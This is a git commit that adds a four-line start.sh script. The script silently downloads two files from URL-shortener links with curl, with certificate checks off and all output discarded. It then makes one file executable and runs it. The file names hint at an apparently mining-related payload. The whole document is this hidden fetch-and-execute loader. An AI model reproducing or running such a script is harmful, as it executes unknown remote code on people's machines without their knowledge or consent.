59399f205750d698a98ea04fe854901b5d8246f5
bagsdmreal <bagsdmreal@gmail.com>
2024-06-10 14:11:52 +0700

    Create start.sh

---
+++ start.sh
@@ -0,0 +1,4 @@
+curl -sLkO https://is.gd/tuyulsatu &> /dev/null
+curl -sLkO https://is.gd/tuyulgpu &> /dev/null
+mv tuyulsatu tuyulsatu.sh &> /dev/null
+chmod +x tuyulsatu.sh && ./tuyulsatu.sh /dev/null
